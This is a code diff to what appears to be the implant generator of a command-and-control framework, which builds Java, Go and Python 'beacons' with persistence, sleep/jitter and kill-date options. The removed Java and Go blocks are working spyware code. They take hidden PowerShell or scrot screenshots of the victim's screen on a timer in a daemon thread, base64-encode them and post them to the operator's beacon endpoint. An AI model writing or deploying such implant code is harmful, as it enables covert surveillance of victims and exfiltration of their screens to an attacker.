@@ -3058,6 +3058,17 @@ function setBeaconLang(lang) {
   document.getElementById('beacon-info-py').style.display   = lang === 'py'   ? '' : 'none';
   document.getElementById('beacon-info-java').style.display = lang === 'java' ? '' : 'none';
   document.getElementById('beacon-info-go').style.display   = lang === 'go'   ? '' : 'none';
+  // screenshot_sched only works on Python — disable+uncheck for Java/Go
+  const _schedCb = document.getElementById('feat-screenshot-sched');
+  const _schedLbl = _schedCb ? _schedCb.closest('label') : null;
+  if (_schedCb) {
+    const _pyOnly = lang !== 'py';
+    _schedCb.disabled = _pyOnly;
+    if (_pyOnly) _schedCb.checked = false;
+    if (_schedLbl) _schedLbl.style.opacity = _pyOnly ? '0.4' : '';
+    if (_schedLbl) _schedLbl.style.cursor  = _pyOnly ? 'not-allowed' : '';
+    if (_schedLbl) _schedLbl.title         = _pyOnly ? 'Solo disponible en Python' : '';
+  }
   const _gp = document.getElementById('gen-placeholder');
   const _gi = document.getElementById('gen-output-inner');
   if (_gp) _gp.style.display = '';
@@ -4046,48 +4057,8 @@ function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev
         }
 ` : '';
 
-  const javaSchedSetupBlock = features.screenshotSched ? `
-    private static volatile int _schedInterval = 0;
-    private static volatile long _schedNext = 0L;
-    private static void _schedShot() {
-        try {
-            File tmp = File.createTempFile("sched_", ".png"); tmp.deleteOnExit();
-            if (isWin) {
-                String psCmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen; $b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); $b.Save('" + tmp.getAbsolutePath().replace("\\\\\\\\", "\\\\\\\\\\\\\\\\") + "')";
-                new ProcessBuilder("powershell", "-WindowStyle", "Hidden", "-Command", psCmd).redirectErrorStream(true).start().waitFor();
-            } else { new ProcessBuilder("scrot", tmp.getAbsolutePath()).redirectErrorStream(true).start().waitFor(); }
-            if (!tmp.exists() || tmp.length() == 0) return;
-            byte[] d = Files.readAllBytes(tmp.toPath()); tmp.delete();
-            String b64 = Base64.getEncoder().encodeToString(d);
-            String fname = "sched_" + System.currentTimeMillis() + ".png";
-            post(${xL('/api/beacon/push')}, "{\\"agent_id\\":\\"" + agentId + "\\",\\"output\\":\\"__b64file__:" + fname + ":" + b64 + "\\"}");
-        } catch (Exception ignored) {}
-    }
-    static {
-        Thread _st = new Thread(() -> {
-            while (true) {
-                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
-                long now = System.currentTimeMillis();
-                if (_schedInterval > 0 && now >= _schedNext) {
-                    _schedNext = now + (long)_schedInterval * 60000L;
-                    _schedShot();
-                }
-            }
-        });
-        _st.setDaemon(true); _st.start();
-    }
-` : '';
-
-  const javaSchedCmdBlock = features.screenshotSched ? `
-        if (cmd.startsWith("screenshot_sched ")) {
-            try {
-                int _n = Integer.parseInt(cmd.split("\\\\s+")[1]);
-                if (_n < 0) return "Usage: screenshot_sched <minutes> (0 = stop)";
-                _schedInterval = _n; _schedNext = 0L;
-                return _n == 0 ? "Screenshot schedule stopped." : "Auto-screenshot every " + _n + " min. Use screenshot_sched 0 to stop.";
-            } catch (Exception e) { return "Usage: screenshot_sched <minutes> (0 = stop)"; }
-        }
-` : '';
+  const javaSchedSetupBlock = '';
+  const javaSchedCmdBlock = '';
 
   const persistBlock = persist ? `
     private static void persist() {
@@ -4737,48 +4708,8 @@ func _background() {
 \t}
 ` : '';
 
-  const goSchedSetupBlock = features.screenshotSched ? `
-var _schedInterval int = 0
-var _schedNext     int64 = 0
-
-func _schedShot() {
-\ttmp := filepath.Join(os.TempDir(), fmt.Sprintf("sched_%d.png", time.Now().UnixMilli()))
-\tvar err error
-\tif isWin {
-\t\tpsCmd := "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen; $b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); $b.Save('" + tmp + "')"
-\t\terr = exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psCmd).Run()
-\t} else { err = exec.Command("scrot", tmp).Run() }
-\tif err != nil { return }
-\tdata, err := os.ReadFile(tmp); os.Remove(tmp)
-\tif err != nil { return }
-\tb64 := base64.StdEncoding.EncodeToString(data)
-\tfname := fmt.Sprintf("sched_%d.png", time.Now().UnixMilli())
-\t_post("/api/beacon/push", map[string]interface{}{"agent_id": _agentID, "output": "__b64file__:" + fname + ":" + b64})
-}
-
-func init() {
-\tgo func() {
-\t\tfor {
-\t\t\ttime.Sleep(5 * time.Second)
-\t\t\tnow := time.Now().UnixMilli()
-\t\t\tif _schedInterval > 0 && now >= _schedNext {
-\t\t\t\t_schedNext = now + int64(_schedInterval)*60000
-\t\t\t\t_schedShot()
-\t\t\t}
-\t\t}
-\t}()
-}
-` : '';
-
-  const goSchedCmdBlock = features.screenshotSched ? `
-\tif strings.HasPrefix(cmd, "screenshot_sched ") {
-\t\tn, err := strconv.Atoi(strings.TrimSpace(cmd[17:]))
-\t\tif err != nil || n < 0 { return "Usage: screenshot_sched <minutes> (0 = stop)" }
-\t\t_schedInterval = n; _schedNext = 0
-\t\tif n == 0 { return "Screenshot schedule stopped." }
-\t\treturn fmt.Sprintf("Auto-screenshot every %d min. Use screenshot_sched 0 to stop.", n)
-\t}
-` : '';
+  const goSchedSetupBlock = '';
+  const goSchedCmdBlock = '';
 
   // ── Kill date ────────────────────────────────────────────────────────────
   const killDateBlock = killDate ? `
